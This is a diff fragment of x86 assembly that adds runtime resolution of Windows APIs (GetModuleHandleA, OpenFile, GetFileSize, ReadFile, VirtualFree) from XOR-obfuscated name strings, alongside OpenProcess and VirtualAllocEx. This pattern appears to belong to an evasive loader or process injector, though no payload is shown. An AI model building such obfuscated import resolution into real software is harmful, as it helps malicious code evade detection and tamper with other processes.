@@ -938,7 +938,15 @@ populate_kernel_function_ptrs_by_name:
     push dword [ebp + 8]
     call unxor_and_get_proc_addr                ; proc addr
 
-    mov [load_library_a], eax                   ; load_library_aA addr
+    mov [load_library_a], eax                   ; LoadLibraryA addr
+
+    push dword 0
+    push dword get_module_handle_a_xor.len
+    push dword get_module_handle_a_xor
+    push dword [ebp + 8]
+    call unxor_and_get_proc_addr                ; proc addr
+
+    mov [get_module_handle_a], eax              ; GetModuleHandleA addr
 
     push dword 0
     push dword get_current_process_xor.len
@@ -965,12 +973,36 @@ populate_kernel_function_ptrs_by_name:
     mov [open_process], eax                     ; OpenProcess addr
 
     push dword 0
+    push dword open_file_xor.len
+    push dword open_file_xor
+    push dword [ebp + 8]
+    call unxor_and_get_proc_addr                ; proc addr
+
+    mov [open_file], eax                        ; OpenFile addr
+
+    push dword 0
+    push dword get_file_size_xor.len
+    push dword get_file_size_xor
+    push dword [ebp + 8]
+    call unxor_and_get_proc_addr                ; proc addr
+
+    mov [get_file_size], eax                    ; GetFileSize addr
+
+    push dword 0
     push dword create_file_a_xor.len
     push dword create_file_a_xor
     push dword [ebp + 8]
     call unxor_and_get_proc_addr                ; proc addr
 
     mov [create_file_a], eax                    ; CreateFileA addr
+
+    push dword 0
+    push dword read_file_xor.len
+    push dword read_file_xor
+    push dword [ebp + 8]
+    call unxor_and_get_proc_addr                ; proc addr
+
+    mov [read_file], eax                        ; ReadFile addr
 
     push dword 0
     push dword write_file_xor.len
@@ -995,6 +1027,14 @@ populate_kernel_function_ptrs_by_name:
     call unxor_and_get_proc_addr                ; proc addr
 
     mov [virtual_alloc_ex], eax                 ; VirtualAllocEx addr
+
+    push dword 0
+    push dword virtual_free_xor.len
+    push dword virtual_free_xor
+    push dword [ebp + 8]
+    call unxor_and_get_proc_addr                ; proc addr
+
+    mov [virtual_free], eax                     ; VirtualFree addr
 
     push dword 0
     push dword virtual_free_ex_xor.len
